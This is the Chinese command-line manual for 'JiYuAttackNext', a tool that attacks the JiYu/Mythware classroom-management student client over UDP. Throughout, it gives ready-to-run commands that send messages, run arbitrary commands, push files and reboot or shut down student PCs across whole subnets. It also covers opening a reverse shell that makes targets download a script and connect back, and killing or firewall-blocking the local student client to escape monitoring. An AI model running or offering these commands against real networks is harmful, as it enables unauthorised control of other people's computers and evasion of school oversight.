<div align="center">
<h1>CLI 模式使用说明</h1>
<p>
   <a href="https://github.com/JasonFang0109c/jiyu_attack_next/releases/tag/nightly"><img alt="Nightly Build" src="https://img.shields.io/badge/Nightly-Build-blue?style=for-the-badge&logo=githubactions&labelColor=212121"></a>
   <img alt="Single EXE" src="https://img.shields.io/badge/运行-单文件%20EXE-2CA5E0?style=for-the-badge&labelColor=212121">
   <img alt="No Python" src="https://img.shields.io/badge/依赖-无需%20Python-3ddc84?style=for-the-badge&labelColor=212121">
</p>
<p><a href="../../README.md">← 返回项目首页</a> 丨 <a href="GUI.md">GUI 模式使用说明</a></p>
</div>

---

GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://github.com/JasonFang0109c/jiyu_attack_next/releases/tag/nightly) 或 [最新正式版](https://github.com/JasonFang0109c/jiyu_attack_next/releases/latest) 下载 **JiYuAttackNext.exe** 即可。无参数启动打开图形界面；带参数启动运行命令行模式，无需安装 Python 或 PySide6。正式版偏稳定，nightly 随 `main` 更新，两者版本号格式见[版本规范](../dev/VERSIONING.md)。

> **提示**
> 单文件即可运行，不需要克隆仓库，也不需要安装 Python。双击 EXE 打开 GUI，在终端带参数运行进入 CLI；相对文件路径按终端当前工作目录解析。

<br>

## 大白话说明

命令行模式就是把图形界面里的按钮换成命令：给一台或多台学生机发话、发指令、开关机，或者在本机起一个反弹终端。命令照界面的分组来写——先写分组和页面，再写这个页面的参数，例如 `remote message` 是文本消息页、`remote device` 是设备操作页、`local info` 是本机信息页。常用的还是那几个：`-ip` 说发给谁，`-msg` 发文字，`-c` 发命令，`--reboot` / `--shutdown` 开关机，其余 `--` 开头的是这个页面自己的选项。

### 常见词的白话解释

| 文档里的说法 | 通俗理解 |
| --- | --- |
| 目标地址 `-ip` | 要操作哪台学生机，可以写一台、一段（`1-10`）或一个网段（`0/24`） |
| 目标端口 `-p` | 学生机收指令的门牌号，默认 `4705`，一般不用改 |
| 报文 | 真正发出去的那串字节；一条消息或命令就是一个或多个报文 |
| 学生端 | 学生机上装的极域客户端，所有远程操作最终都是发给它的 |
| 已送达 / 发送成功 | 只表示报文没被网络拒绝、对方在线，不代表学生机一定执行了 |
| 拒绝 / 超时 | 对方端口没人接、地址不通，或者被防火墙拦了 |

### 子命令一句话版

| 分组 / 子命令 | 对应界面页面 | 一句话说明 |
| --- | --- | --- |
| `remote message` | 文本消息 | 给学生机弹一句话：`-msg` 或 `--msg-file` 二选一，`-l` / `-t` 管重复轮次与间隔 |
| `remote command` | 远程命令 | 让学生机执行一条命令行（`-c`），不回显输出 |
| `remote file` | 文件传送 | 把文件或文件夹丢到学生机桌面（`--file`） |
| `remote device` | 设备操作 | `--reboot` 重启、`--shutdown` 关机、`--logoff` 注销；三个动作互斥，重启与关机用固定报文，不带倒计时与提示 |
| `remote shell` | 反弹终端 | 在学生机上开一个可以一直打字的命令行 |
| `restriction student` | 启停学生端 | 按当前状态启动或结束本机极域学生端，腾出被独占的 4705 端口 |
| `local info` | 本机信息 | 查自己这台机器的 IP 和学生端端口 |
| `local firewall` | 防火墙 | `block` 断掉学生端网络、`allow` 恢复 |

### 常见疑问

**为什么显示“已送达”但对方没反应？**
这条判断只看网络：端口有没有人接、主机在不在线。学生机收下了报文但没执行（比如它没开对应功能、版本不同或班级策略不允许），命令行是看不到的。要确认执行结果只能看目标屏幕。

### 命令从哪来

命令按界面分组，功能大多对应两个来源项目：

| 来源 | 对应功能 |
| --- | --- |
| `Jiyu_udp_attack` | 文本消息（`remote message`）、远程命令（`remote command`）、重启与关机（`remote device`）、本机信息（`local info`）、防火墙规则（`local firewall`）的报文结构 |
| 本程序新增 | 注销（`remote device --logoff`）、文件传送（`remote file`）、反弹终端（`remote shell`）、启停学生端（`restriction student`） |

来源的 `-e r` / `-e s` 是重发一份固定模板，本程序照旧重发同一份模板；来源的 `-e nc` 依赖外网脚本与 `powercat`，本程序的 `remote shell` 自己起脚本服务。

<br>

## 快速开始

三步即可发送第一条消息：

<div align="center">
<table width="100%" style="border: none;">
  <tr>
    <td width="33%" valign="top">
      <h3>📥 获取程序</h3>
      <p>下载 <code>JiYuAttackNext.exe</code>，保存到任意目录。</p>
    </td>
    <td width="33%" valign="top">
      <h3>▶️ 运行命令</h3>
      <p>在 EXE 所在目录打开终端，带上目标地址与功能参数。</p>
    </td>
    <td width="33%" valign="top">
      <h3>✅ 查看结果</h3>
      <p>终端按目标输出“成功/失败”与原因；能否执行由学生端决定。</p>
    </td>
  </tr>
</table>
</div>

<br>

## 运行环境

Windows 10/11。EXE 已包含 Python 运行时，命令行模式无需安装 Python 或 PySide6；只有从源码运行 CLI 时才需要 Python 3.13，在项目根目录执行 `python -m app ...` 即可。

以下示例默认在保存 `JiYuAttackNext.exe` 的目录中执行 PowerShell。PowerShell 需要 `.\` 前缀；命令提示符（cmd）可直接写 `JiYuAttackNext.exe`。

```powershell
.\JiYuAttackNext.exe -h
.\JiYuAttackNext.exe --version
```

`--version` 输出程序版本号，用于确认下载到的版本；版本号规则见[版本规范](../dev/VERSIONING.md)。正式版形如 `0.1.0`，测试版形如 `0.1.0-1a8ede3`：末尾 7 位是这次构建的提交哈希，方便对照是哪次改动。

通用格式：

```text
JiYuAttackNext.exe <分组> <子命令> [-ip <目标地址>] [-p <目标端口>] <该页面的参数>
```

先写分组与子命令，再跟这个页面的参数。`-ip` 只有需要目标的功能才要求，默认 UDP 端口为 `4705`；`local info`、`local firewall` 与 `restriction student` 不需要目标地址。无参数启动会打开 GUI，带 `-h`、`--version` 或其他参数时运行 CLI；GUI 的启动与操作见 [GUI 模式使用说明](GUI.md)。

在命令提示符（cmd）中可直接运行：

```bat
JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
```

EXE 是窗口化程序，双击无参数启动只打开 GUI，不会创建控制台窗口。从终端带参数启动时，程序把输出写回当前终端，不会另开控制台窗口；由于它不占用控制台，提示符会立即返回，需要等命令执行完再继续时用 `start /wait`：

```bat
start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
```

重定向输出（`> 结果.txt`）与管道仍然有效。

<br>

## 分组命令

命令按图形界面的分组组织，一个页面就是一条子命令，因此不记得参数时可以先从分组找：

```powershell
# 先看有哪些分组
.\JiYuAttackNext.exe -h

# 再看某个页面能用哪些参数
.\JiYuAttackNext.exe remote message -h
```

| 子命令 | 例子 |
| --- | --- |
| `restriction student` | `restriction student --list`、`restriction student --start` |
| `remote message` | `remote message -ip 192.168.1.10 -msg "下课了"` |
| `remote file` | `remote file -ip 192.168.1.10 --file 报告.pdf` |
| `remote device` | `remote device -ip 192.168.1.10 --shutdown` |
| `remote command` | `remote command -ip 192.168.1.10 -c whoami` |
| `remote shell` | `remote shell -ip 192.168.1.10` |
| `local info` | `local info` |
| `local firewall` | `local firewall block`、`local firewall allow` |

子命令之后的参数与下面“参数参考”完全一致，只是省掉了不属于该页面的部分。旧的扁平写法（`-ip ... -msg ...`、`-c ...`）仍然可用，两种写法解析出的字段相同，可以按习惯自由选择；同一次调用里混用两种写法会报参数错误。

<br>

## 参数参考

参数按子命令分组：先写 `<分组> <子命令>`，再跟这个页面自己的参数。`-h` 只列出当前子命令支持的参数，所以不记得某个页面能做什么时，直接看它自己的帮助即可。

### 帮助、版本与连接参数

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `-h` / `--help` | 开关 | 无 | 显示当前层级的帮助并退出 |
| `-V` / `--version` | 开关 | 无 | 仅在程序根级使用，显示版本号并退出（测试版末尾带提交哈希） |
| `-ip` | 字符串 | 无 | 目标地址，支持单个 IPv4、同网段末段范围及 `/24`；只用于支持连接参数的子命令 |
| `-p` | 整数 | `4705` | 目标 UDP 端口；只用于支持连接参数的子命令 |

### remote message（文本消息）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `-msg TEXT` | 字符串 | 无 | 发送文本消息，保留多行内容；超长文本自动分条 |
| `--msg-file PATH` | 路径 | 无 | 从 UTF-8 文件读取消息；`-` 表示标准输入；与 `-msg` 互斥 |
| `-l N` | 整数 | `1` | 发送轮数；每轮遍历全部目标与报文 |
| `-t N` | 整数 | `22` | 轮次之间的等待秒数，仅多轮发送时生效 |

### remote command（远程命令）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `-c TEXT` | 字符串 | 无 | 发送待执行的命令，单条最多 163 个 UTF-16 单元 |
| `-l N` | 整数 | `1` | 发送轮数；每轮遍历全部目标 |
| `-t N` | 整数 | `22` | 轮次之间的等待秒数，仅多轮发送时生效 |

命令走 `-c` 报文通道，目标是否执行、输出到哪里都由学生端决定；要看实时回显请用 `remote shell`。

### remote file（文件传送）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `--file PATH [PATH ...]` | 路径 | 无 | 传送一个或多个文件、文件夹到目标桌面，文件夹按原结构递归 |
| `--file-ip ADDRESS` | IPv4 | 自动检测 | 写入下载命令的本机 IPv4；多网卡或自动检测异常时手动指定 |
| `--file-timeout SECONDS` | 秒 | `120` | 等待每个目标下载完成的秒数，须大于 0 |

### remote device（设备操作）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `--reboot` | 开关 | — | 重启目标电脑，重发来源项目里那份固定的重启报文 |
| `--shutdown` | 开关 | — | 关闭目标电脑，重发来源项目里那份固定的关机报文 |
| `--logoff` | 开关 | — | 注销目标当前登录用户，通过远程命令执行 `shutdown /l` |

三个动作互斥，必须选一个。重启与关机用来源项目 `-e r` / `-e s` 的固定报文，不带倒计时与提示文字；注销没有独立报文，走远程命令通道执行 `shutdown /l`。

### remote shell（反弹终端）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `--shell-port PORT` | 整数 | `0` | 本机终端监听端口，`0` 表示随机；脚本服务端口同样随机 |
| `--shell-ip ADDRESS` | 地址 | 自动 | 目标回连时使用的本机地址，留空时按目标地址自动挑选出口地址 |

子命令本身就会启动反弹终端：先在本机起一个 TCP 终端监听和一个只提供启动脚本的临时 HTTP 服务，再通过远程命令让目标下载脚本并连回来，连上后逐条输入命令。连接命令要挤进单条远程命令的 163 个 UTF-16 单元里，因此本机地址与端口都由程序自己挑选。目标是窗口化的 EXE 时，程序会把标准输入重新绑定到控制台，交互与在源码里运行一致。

### restriction student（启停学生端）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| （不带参数） | — | — | 按当前状态切换：有学生端在运行就结束，没有就启动 |
| `--list` | 开关 | 关 | 只列出进程号、进程名、占用端口与程序路径，不做任何改动 |
| `--start` | 开关 | 关 | 强制启动学生端，路径留空时自动查找 |
| `--exe PATH` | 路径 | 无 | 配合 `--start` 指定主程序的完整路径 |
| `--pid PID` | 整数 | 无 | 只结束指定进程，可重复 |

### local info（本机信息）

没有额外参数：打印本机 IPv4 与 `Student` 相关进程可能监听的端口，等价于早期的 `-e g`。只查运行命令的本机，不发任何报文。

### local firewall（防火墙）

| 参数 | 类型 | 默认值 | 用途与说明 |
| --- | --- | --- | --- |
| `block` / `allow` | 位置参数 | 无 | `block` 阻断学生端连接，`allow` 把规则改回允许 |

`block` 会启动 `MpsSvc`、打开全部配置文件的防火墙，并把名为 `StudentMain.exe` 的规则改成阻断；`allow` 只把该规则改回允许，不还原其他防火墙设置。两项都需要管理员权限，未提升时弹出 UAC，由隐藏的管理员助手完成后回传结果。

### 旧的扁平写法

早期与来源项目的写法（`-ip ... -msg ...`、`-c ...`）仍然可用，与子命令解析出的字段相同：

| 扁平写法 | 等价子命令 |
| --- | --- |
| `-msg`、`--msg-file`、`-l`、`-t` | `remote message` |
| `-c` | `remote command` |
| `--file`、`--file-ip`、`--file-timeout` | `remote file` |
| `-e r` / `-e s` / `-e l` | `remote device --reboot` / `--shutdown` / `--logoff` |
| `--shell`、`-e nc`、`--shell-port`、`--shell-ip` | `remote shell` |
| `-e g` | `local info` |
| `-e break` / `-e continue` | `local firewall block` / `allow` |
| `--end-student`、`--end-student-pid`、`--list-student`、`--start-student`、`--student-exe` | `restriction student` |

同一行里混用两套写法会报参数错误：要么全部用子命令，要么全部用扁平参数。

<br>

## 目标地址格式

一句话：`-ip` 决定发给谁，可以是一台、一段或一个网段。

| 格式 | 参数示例 | 目标范围 |
| --- | --- | --- |
| 单个地址 | `-ip 10.49.151.29` | 仅 `10.49.151.29` |
| 同网段范围 | `-ip 10.49.151.1-10` | `10.49.151.1` 至 `10.49.151.10`，含两端 |
| `/24` 网段 | `-ip 10.49.151.0/24` | `10.49.151.1` 至 `10.49.151.254` |

范围写法右侧仅填写末段数字；仅支持 `/24` 网段，不支持任意 CIDR 前缀。地址会经过 IPv4 格式校验，范围或网段无效时直接提示错误。

<br>

## 使用示例

示例中的 `10.49.151.29` 为占位目标地址，运行前请按实际测试环境替换。

### 发送文本消息

```powershell
.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
```

### 发送多行文本

使用 PowerShell 的 Here-String 可保留换行、空行与缩进：

```powershell
$message = @'
第一行通知
第二行通知

第四行通知
'@
.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg $message
```

CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转成换行；目标端是否按多行显示取决于学生端消息窗口的实现。

### 从文件读取长文本

文本保存为 UTF-8 文件，可包含多行内容、空行及中文，也支持带 BOM 的 UTF-8。

```powershell
.\JiYuAttackNext.exe remote message -ip 10.49.151.29 --msg-file "notice.txt"
```

`--msg-file -` 从标准输入读取文本，适合较长内容并避免将全文放入命令行参数；`--msg-file` 与 `-msg` 不可同时使用。

### 消息容量与分条行为

单条报文为 954 字节，正文从偏移 56 开始，每条为字符串结束符预留 2 字节，正文最多 **896 字节，即 448 个 UTF-16 单元**。普通中文、英文字母通常占 1 个单元，部分字符占 2 个单元，换行符也计入容量。这是发送缓冲区的容量，并非已验证的学生端显示上限。

总文本不设固定长度上限，超出单条容量时自动拆成多条独立消息，保留文本内容及换行，不拆开单个 Unicode 码点。总长度受可用内存及输入方式限制，文本不支持内嵌 NUL 字符。

**分条不等于接收端合并。** CLI 模式按顺序发送各条报文，但不提供接收端重组、回执或重传机制，不能保证长文本在目标端完整、有序地显示为同一条消息。

发送结束后会逐个目标打印结果：`[成功] 192.168.1.10：已送达（1 个报文）` 或 `[-] [失败] 192.168.1.10：失败：目标端口未响应`，最后一行汇总成功与失败数量。判定依据只有网络反馈：目标端口或主机返回 ICMP 不可达时判为“失败：目标端口未响应”或“失败：目标不可达”；没有收到错误时再主动发一次 ICMP 回显，主机有回应、或同网段能通过 ARP 解析到它时判为“已送达”，两者都没有则判为“失败：目标未响应”。因此“成功”只表示报文没有被网络拒绝、对方在线，仍不能证明学生端已经执行。

### 指定目标端口

```powershell
.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -p 4705 -msg "Test message"
```

### 发送查询命令

```powershell
.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
```

### 使用包含空格的路径

在 PowerShell 中，用外层单引号包裹整个命令，并用内层双引号包裹路径：

```powershell
.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
```

### 传送文件到桌面

以下命令选择本机文件，并通过目标学生端的远程命令能力触发系统自带的 `curl` 下载：

```powershell
.\JiYuAttackNext.exe remote file -ip 10.49.151.1-10 --file "D:\资料\实验报告.pdf" --file-timeout 180
```

CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机令牌的下载命令，目标使用当前登录用户桌面保存同名文件。下载完成后写入正式文件，中断则清理 `.part` 临时文件。UDP 命令未得到目标响应时最多重发 3 次，避免单次丢包造成任务无响应。

`--file` 可以一次给多个路径，文件与文件夹可以混用：

```powershell
.\JiYuAttackNext.exe remote file -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" "D:\课件" "readme.txt"
```

文件夹按原结构递归展开：上例中的 `D:\课件` 会把其下所有层级的文件按相对路径一起传送，目标桌面出现同名文件夹。重复给出的路径只保留一次；一个文件夹里没有文件，或路径不存在时直接报错，不会静默跳过。

- 目标电脑不需要开放入站端口，只需允许执行远程命令、提供 Windows 自带的 `curl.exe`，并允许其主动访问发送端的自动检测 IP 与随机 TCP 端口。
- 发送端 Windows 防火墙需允许 EXE 或临时 HTTP 服务监听；GUI 首次使用时按系统提示允许。
- 目标只保存文件，不会自动打开、通知或回传执行结果。
- 自动检测会忽略 `198.18.0.0/15` 等虚拟或基准测试网段，并在出口地址不可用时选择与目标网段更接近的真实局域网地址。TUN/VPN 或多网卡环境仍检测错误时，使用 `--file-ip 10.49.151.20` 手动指定发送端 IP。
- 多个目标按顺序逐个传送，每个目标单独等待下载，某个目标失败后继续尝试其余目标并汇总失败目标；`--file-timeout` 按单个目标计算。
- 每个目标的文件服务只在该目标等待下载期间运行，超时或任务取消后停止。失败信息会区分“目标未访问文件服务”“目标已取脚本但未下载”和“下载中断”。

### 查询本机信息

```powershell
.\JiYuAttackNext.exe local info
```

仅查询运行 CLI 模式的本机，不查询远程目标；未匹配到学生端进程或端口时输出可能不完整。

### 启停本机学生端

如果本机装着极域学生端（`StudentMain.exe`），它会独占本机地址的 4705 端口，把本该由本程序处理的学生端回包全部收走。需要腾出端口时先结束它；验证完想恢复课堂管理，再用同一个子命令把它启动起来。

```powershell
# 只列进程与占用端口，不动进程
.\JiYuAttackNext.exe restriction student --list

# 按当前状态切换：有进程就结束，没有就启动，与界面上的单按钮一致
.\JiYuAttackNext.exe restriction student

# 只结束指定进程
.\JiYuAttackNext.exe restriction student --pid 17600

# 启动学生端，留空路径时自动查找安装位置
.\JiYuAttackNext.exe restriction student --start

# 指定程序路径启动
.\JiYuAttackNext.exe restriction student --start --exe "C:\Program Files\TopDomain\e-Learning Class Standard\1.00\StudentMain.exe"
```

结束分三层：先请学生端正常退出，等不到进程消失再强制结束，仍被拒绝才走管理员授权；学生端不响应正常退出，`taskkill` 不加 `/F` 也会报成功，所以判定以进程是否真的消失为准。启动会依次查运行中的进程、卸载信息、极域服务所在目录与常见安装目录，拉起后等最多 5 秒确认。结束后学生端又被拉起来时，会提示是守护服务重启了它。进程、端口与程序路径来自 `tasklist`、`netstat` 与 `Get-Process`；路径读不到时（例如学生端以 SYSTEM 运行）显示“不可读”，这不影响结束。列表会标注同目录是否带 `LibTDMaster.dll`，没有这个库的同名进程通常是冒牌货。

不带选项时按状态决定方向，和界面上那个按钮一样：有进程就结束并打印被结束的进程，没有就启动。`--start` 是强制启动（用于确认方向），`--pid` 只结束指定进程，`--list` 只查看。

启动时依次找：手动 `--exe` → 运行中的真身进程 → 卸载信息里的 `DisplayIcon` → 卸载信息里的 `InstallLocation` → 常见安装目录（含 `Mythware\e-Learning Class` 与中文目录）。拉起后会在 5 秒内轮询确认进程真的起来了，没确认到会提示可能被安全软件拦下；本机已经在运行学生端时不会重复启动。扁平写法对应 `--end-student`、`--end-student-pid`、`--list-student`、`--start-student`、`--student-exe`。

### 用本机 IP 测试

没有第二台测试设备时，可以把 `-ip` 指向运行程序的本机 IPv4 地址，例如 `-ip 192.168.1.20`。CLI 会照常发送 UDP 报文；本机没有学生端监听对应端口时不会产生可见效果。

```powershell
.\JiYuAttackNext.exe remote message -ip 192.168.1.20 -msg "本机测试"
```

仓库提供的 `scripts/test_local_ip.py` 会自动选择本机地址，在空闲 UDP 端口上接收并校验消息、命令、重启、关机、注销和连续发送报文，适合验证协议与发送流程；运行方式见[开发与提交规范](../dev/CONTRIBUTING.md#本机-ip-自测)。

### 控制发送轮数与间隔

以下命令发送 3 轮消息，相邻两轮之间等待 10 秒，最后一轮结束后不再等待：

```powershell
.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
```

### 组合发送消息与命令

子命令一次只做一件事，所以要同时发消息和命令，就写两条命令：

```powershell
.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Test"
.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
```

早期与来源项目那种一行写完的扁平写法仍然保留，它也支持把消息、命令与开关机放在一次调用里：

```powershell
.\JiYuAttackNext.exe -ip 10.49.151.29 -msg "Test" -c "cmd.exe /c ipconfig" -e r
```

扁平写法每轮按消息、命令、重启、关机或注销报文的顺序发送；实际是否执行及执行顺序由目标端决定。子命令写法没有这种合并能力，两条命令之间也不保证先后顺序，需要顺序时等前一条返回再发下一条。

### 发送重启、关机或注销指令

```powershell
# 重启目标
.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --reboot

# 关闭目标
.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --shutdown

# 注销目标当前登录用户
.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --logoff
```

### 反弹终端

```powershell
# 随机端口监听，并把回连命令发到目标
.\JiYuAttackNext.exe remote shell -ip 10.49.151.29

# 指定本机回连地址与监听端口
.\JiYuAttackNext.exe remote shell -ip 10.49.151.29 --shell-ip 10.49.151.2 --shell-port 9001
```

启动后终端会打印终端监听端口与脚本服务端口，连上目标后逐行输入命令，`exit` 或 `quit` 结束并断开。目标没有连回来时输入的指令只会提示未发送，不会静默丢弃。

<br>

## 行为与限制

下面几条踩坑率最高，先看这一段能省不少时间。

- **发送结果**：“已送达”只看网络：端口有没有人接、主机在不在线。学生机收下报文但没执行（没开对应功能、版本不同或班级策略不允许），命令行是看不到的，要确认结果只能看目标屏幕。
- **循环参数**：`-l` 填几轮、`-t` 填每轮之间等几秒。等待发生在两轮之间，不在每台设备之间。
- **功能组合**：扁平写法下 `-msg`、`-c` 可以与 `-e r`、`-e s`、`-e l` 一起用，一条命令同时发消息和关机；换了子命令则一次只做一件事，要并发就在一行里写两条命令（或用 `;` 连起来）。只管本机的 `local info`、`local firewall` 做完就退出；`remote shell` 与 `restriction student` 是独立分支，不会顺带发消息或命令。
- **文本编码**：消息与命令按 `utf-16le` 编码，中文正常，`\n` 也算容量。消息超长自动分条，命令受单条报文容量限制，超了会直接报错。
- **输出范围**：`remote command` 不会把目标命令的输出传回当前终端，要实时回显请用 `remote shell`。

<br>

## 运行日志

CLI 模式也会写运行日志，文件是数据目录下的 `cli.log`，与 GUI 的 `runtime.log` 分开，两个模式可以同时运行、各写各的文件。数据目录与 GUI 相同：EXE 所在目录下的 `JiYuAttackNextData`，源码运行时位于项目根目录。

- 没有等级开关，按构建变体的默认等级写入：正常版本写 `WARNING` 与 `ERROR`（图形界面里调低到 `INFO` 只影响界面自身的日志，命令行始终按默认等级落盘），`JiYuAttackNext_Debug.exe` 从 `DEBUG` 起记录。正常版本保留参数错误、发送失败与异常；排查报文细节时改用 `_Debug` 版本，它还会写入参数快照、目标与报文数量、每个目标的送达判定、文件传送的路径与监听端口。
- 只查帮助或版本号（`-h`、`--help`、`-V`、`--version`，包括子命令帮助）不会创建数据目录，也不写日志：这类调用没有副作用，不留下空目录与只有一行的日志文件。
- 格式与 GUI 日志一致，可以直接用同一个查看器阅读：`2026-11-04 13:29:10.527 [10440] [MainThread] DEBUG   app.cli.main.main:318 - [命令行] 命令行参数`，多行内容以缩进续行写入。
- 文件在本次运行期间保持打开，每条记录写入后刷新文件缓冲，命令结束时关闭句柄。
- 目录不可写时只在终端提示一次“命令行日志保存失败”，命令本身照常执行，不会因为写日志失败而中断。

<br>

## 问题排查

| 现象 | 可能原因 | 检查建议 |
| --- | --- | --- |
| 提示找不到命令或程序 | 终端不在 EXE 所在目录，或 PowerShell 未加 `.\` 前缀 | 切换到 EXE 所在目录；PowerShell 使用 `.\JiYuAttackNext.exe ...`，cmd 可直接写 `JiYuAttackNext.exe ...`，也可使用绝对路径 |
| 双击后只打开 GUI | 无参数启动按设计进入 GUI | 在终端带功能参数启动 CLI，例如 `.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"` |
| 提示“发送成功”，目标无响应 | 地址或端口不匹配、报文被拦截、学生端未监听、目标未执行指令 | 核对目标地址、UDP 端口、学生端状态及目标端执行结果 |
| 包含空格的路径处理失败 | 路径未完整加引号，或引号在终端传参时发生变化 | 参考包含空格路径的示例，并核对目标端路径 |
| `local info` 未显示端口 | 未找到 `Student` 相关进程或其 UDP 监听端口 | 在本机核对进程与监听状态；查询失败时会显示错误原因 |
| 只有 IP、没有功能参数时无法发送 | 没有生成任何待发送报文 | 补上子命令与动作，例如 `remote message -msg ...`、`remote command -c ...` |
| 长命令报错 | 命令超过固定报文缓冲区容量 | 缩短命令，检查终端输出的异常信息 |
| 长消息只显示部分内容或顺序不一致 | 消息被拆成独立报文，未提供接收端重组与可靠交付机制 | 核对目标端实际显示结果；分条发送不能保证合并为单条消息 |
| `--msg-file` 无法读取 | 文件不存在或文件编码不是 UTF-8 | 核对路径，将文件保存为 UTF-8 编码 |
